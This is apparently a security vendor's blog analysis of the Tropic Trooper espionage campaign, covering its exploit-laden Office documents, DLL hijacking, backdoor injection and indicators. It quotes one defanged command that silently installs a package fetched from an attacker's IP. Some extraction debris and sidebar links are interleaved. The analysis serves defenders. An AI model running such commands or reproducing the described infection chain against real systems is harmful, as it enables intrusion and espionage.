Its operators are believed to be very organized and develop their own cyberespionage\ntools that they fine-tuned in their recent campaigns. Many of the tools they use now feature new\nbehaviors, including a change in the way they maintain a foothold in the targeted network.\n\n**_Attack Chain_**\n\n_Figure 1. Attack chain of Tropic Trooper’s operations_\n\nHere’s a summary of the attack chain of Tropic Trooper’s recent campaigns:\n\n[1. Execute a command through exploits for CVE-2017-11882 or CVE-2018-0802, security flaws in](https://blog.trendmicro.com/trendlabs-security-intelligence/cve-2017-11882-exploited-deliver-cracked-version-loki-infostealer/)\n\nMicrosoft Office’s Equation Editor (EQNEDT32.EXE).\n2. Download an installer package (.msi) and install it on the system by executing the command: /c\n\n_msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys])._\n3. This system configuration file (in.sys) will drop a backdoor installer (UserInstall.exe) then delete\n\nitself. The backdoor installer will drop a normal sidebar.exe file (a Windows Gadget tool, a feature\n[already discontinued by Windows), a malicious loader (in](https://support.microsoft.com/en-ph/help/13787/gadgets-have-been-discontinued)\n_“C:\\ProgramData\\Apple\\Update\\wab32res.dll“), and an encrypted configuration file._\n_[UserInstall.exe will abuse the BITSadmin command-line tool to create a job and launch](https://msdn.microsoft.com/en-us/library/windows/desktop/aa362813(v=vs.85).aspx)_\n_sidebar.exe._\n4. The malicious loader will use dynamic-link library (DLL) hijacking — injecting malicious code\n\ninto a process of a file/application — on sidebar.exe and launch dllhost.exe (a normal file). The\nloader will then inject a DLL backdoor into dllhost.exe.\nWe also observed malicious documents that don’t need to download anything from the internet as\nthe backdoor’s dropper is already embedded in the document. This, however, doesn’t influence the\noverall result for the victim.\n\nTh b kd ill l d h d fi i fil d d i h S S k\n\n\nFeatured Stories\n\nsystemd Vulnerability Leads\n[to Denial of Service on](http://blog.trendmicro.com/trendlabs-security-intelligence/systemd-vulnerability-leads-to-denial-of-service-on-linux/)\nLinux\nqkG Filecoder: Self[Replicating, Document-](http://blog.trendmicro.com/trendlabs-security-intelligence/qkg-filecoder-self-replicating-document-encrypting-ransomware/)\nEncrypting Ransomware\nMitigating CVE-2017-5689,\n[an Intel Management Engine](http://blog.trendmicro.com/trendlabs-security-intelligence/mitigating-cve-2017-5689-intel-management-engine-vulnerability/)\nVulnerability\nA Closer Look at North\nKorea’s Internet\nFrom Cybercrime to\nCyberpropaganda\n\nSecurity Predictions for 2018\n\nAttackers are banking on\nnetwork vulnerabilities and\ninherent weaknesses to\nfacilitate massive malware\nattacks, IoT hacks, and\noperational disruptions.

Below is a screenshot of the document used in their latest campaigns:\n\n_Figure 2. Malicious document used by Tropic Trooper_\n\n**_PDB Strings as Context Clues_**\nThe MSI file has two program database (PDB) strings inside: one belonging to the MSI file, and\nanother for the backdoor installer (detected by Trend Micro as TROJ_TCDROP.ZTFB).\n\n_Figure 3. PDB strings inside the MSI file_\n\nThe first PDB string has a certain ss2/Projects/MsiWrapper (Project MsiWrapper) in it, which we\nfound to be an open-source application that converts executable setup programs to MSI files. The\nsecond PDB string contains Work, House, and TSSL: we can assume this tool belongs to Tropic\n[Trooper’s TSSL project as seen by other researchers. Here it is a new one, as seen in their](https://www.pwc.co.uk/issues/cyber-security-data-privacy/research/the-keyboys-are-back-in-town.html)\nmisspelling of “Horse” to “House” (other reports had the string typed correctly).\n\nAnother interesting PDB string we found is\n_D:\\Work\\Project\\VS\\house\\Apple\\Apple_20180115\\Release\\InstallClient.pdb. At installation, the_\nMSI file drops three files and creates one hidden directory (UFile) into\n_C:\\ProgramData\\Apple\\Update\\, likely as a ruse._\n\nIt would then use sidebar.exe to load the malicious wab32res.dll (TROJ_TCLT.ZDFB) through\nDLL hijacking. This is carried out to evade antivirus (AV) detection, because wab32res.dll is\nloaded by a benign file.\n\n_Figure 4. The installer drops three files into the Apple/Update directory_\n\n_Figure 5. PDB strings inside the loader file_\n\nFrom the PDB string above, the attackers intended it to be a loader (hence the name FakeRun) and\nnot the actual backdoor. FakeRun’s PDB string\n(D:\\Work\\Project\\VS\\house\\Apple\\Apple_20180115\\Release\\FakeRun.pdb) indicates the loader will\nexecute dllhost.exe and inject one malicious DLL file, which is the backdoor, into this process. The\nbackdoor, TClient (BKDR_TCLT.ZDFB), is so named from its own PDB string.\n\n\ng\n\nqkG Filecoder: Self[Replicating, Document-](https://blog.trendmicro.com/trendlabs-security-intelligence/qkg-filecoder-self-replicating-document-encrypting-ransomware/)\nEncrypting Ransomware\n\nBad Rabbit Ransomware\n[Spreads via Network, Hits](https://blog.trendmicro.com/trendlabs-security-intelligence/bad-rabbit-ransomware-spreads-via-network-hits-ukraine-russia/)\nUkraine and Russia\n\nA Look at Locky\n[Ransomware’s Recent Spam](https://blog.trendmicro.com/trendlabs-security-intelligence/look-locky-ransomwares-recent-spam-activities/)\nActivities\n\nMagnitude Exploit Kit Now\n[Targeting South Korea With](https://blog.trendmicro.com/trendlabs-security-intelligence/magnitude-exploit-kit-now-targeting-korea-with-magniber-ransomware/)\nMagniber Ransomware\n\nRecent Posts\n\nTropic Trooper’s New\nStrategy\n\nMarch Patch Tuesday\nFixes 75 Security Issues,\n[Drops Registry Key](https://blog.trendmicro.com/trendlabs-security-intelligence/march-patch-tuesday-fixes-75-security-issues-drops-registry-key-requirement-in-windows-10/)\nRequirement in Windows\n10\n\nDetecting Attacks that\nExploit Meltdown and\nSpectre with Performance\nCounters\n\nCampaign Possibly\nConnected to\n[“MuddyWater” Surfaces](https://blog.trendmicro.com/trendlabs-security-intelligence/campaign-possibly-connected-muddywater-surfaces-middle-east-central-asia/)\nin the Middle East and\nCentral Asia\n\nCryptocurrency-Mining\n[Malware: 2018’s New](https://blog.trendmicro.com/trendlabs-security-intelligence/cryptocurrency-mining-malware-2018-new-menace/)\nMenace?\n\nRansomware 101\n\nThis infographic shows how\nransomware has evolved,\nhow big the problem has\nbecome, and ways to avoid\nbeing a ransomware victim.\n[Check the infographic](http://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-101-what-it-is-and-how-it-works)\n\nPopular Posts\n\nHomemade Browser\n[Targeting Banco do Brasil](https://blog.trendmicro.com/trendlabs-security-intelligence/homemade-browser-targeting-banco-do-brasil-users/)\nUsers\nVulnerabilities in Apache\n[CouchDB Open the Door to](https://blog.trendmicro.com/trendlabs-security-intelligence/vulnerabilities-apache-couchdb-open-door-monero-miners/)\n\n\n-----\n\n_Figure 6.

Once the loader is executed, it will check the current_\nprocess (sidebar.exe) whether to load it or not. Successfully checking the loader will execute the\n_dllhost.exe process and create a hardcode mutex to avoid injecting it into the wrong dllhost.exe, as_\nthere can be multiple instances of it depending on the number of programs using the Internet\nInformation Services.\n\n_Figure 7. The loader checking the sidebar process_\n\n_Figure 8. The malicious loader injecting the backdoor into dllhost.exe_\n\n_[Figure 9. Comparison of TClient’s configuration format in 2016 (left, from other researchers) and](https://citizenlab.ca/2016/11/parliament-keyboy/)_\n\n_2018 (right)_\n\nTClient will use SSL to connect to Tropic Trooper’s C&C server. However, the C&C server and\nsome configuration values are not hardcoded in the backdoor. This allows Tropic Trooper’s\noperators to easily change/update the C&C server and configure other values.\n\nTClient is actually one of Tropic Trooper’s other backdoors. The backdoor noted by other security\nresearchers was encoded with different algorithms and configured with different parameter names\nin 2016, for instance. TClient uses symmetric encryption to decrypt its configuration with one 16byte key in 2018. The image and table below illustrate TClient’s encrypted configuration that we\ndecrypted (via Python code):\n\n_Figure 10.

Decrypted backdoor configuration_\n\nReverse analysis of TClient allowed us to determine how to decrypt the C&C information. TClient\nwill use custom SSL libraries to connect the C&C server. We also found another SSL certificate on\nthis C&C server. A closer look reveals that it was registered quite recently, and is set to expire after\na year, suggesting Tropic Trooper’s use or abuse of components or services that elapse so they can\nleave as few traces as possible.\n\n_Figure 13. SSL certificate’s validity_\n\n**_Following Tropic Trooper’s Trails_**\nWe further monitored their activities and found three additional and notable PDB strings in their\nmalware:\n\nD:\\Work\\Project\\VS\\HSSL\\HSSL_Unicode _2\\Release\\ServiceClient.pdb\nD:\\Work\\VS\\Horse\\TSSL\\TSSL_v3.0\\TClient\\Release\\TClient.pdb\nD:\\Work\\VS\\Horse\\TSSL\\TSSL_v0.3.1_20170722\\TClient\\x64\\Release\\TClient.pdb\nThese came from open-intelligence platforms and incident response cases. These strings shed\nfurther light on Tropic Trooper’s operations:\n\nThey have another campaign/project named HSSL, which supports Unicode characters.\nThe TSSL project has a v3.0 version, indicating the operators can mix and match different versions\nof their malware, depending on their target.\nThe TSSL project has 64-bit version.\n**_The Need for a Proactive Incident Response Strategy_**\nCyberespionage campaigns are persistent and, as shown by Tropic Trooper, always raring to exploit\nweaknesses in people and technology. For organizations, this highlights the significance of staying\nahead of their attackers: detect, analyze, and respond. What techniques will they use? How can my\norganization’s attack surface be reduced? What did I do to respond to the threat — what worked,\nwhat didn’t, and what could be fine-tuned?\n\n[A proactive incident response strategy provides threat intelligence — from the endpoint to the](http://blog.trendmicro.com/trendlabs-security-intelligence/four-steps-to-an-effective-targeted-attack-response/)\nnetwork — that can let IT/system administrators identify malicious activities that aren’t typically\nvisible to traditional security solutions.\n\nTClient, for instance, uses DLL hijacking and injection that may not be as noticeable to others. Its\nuse of the SSL protocol also means it can blend with legitimate traffic. Analyzing their PDB strings\ncan also provide a deeper insight into the campaign’s bigger picture. Ascertaining the tactics and\ntechniques they use empower organizations in developing robust and actionable indicators of\ncompromise (IoCs) that can act as benchmarks for response\n\n\n-----\n\nKeep the system, its applications, and the network updated.
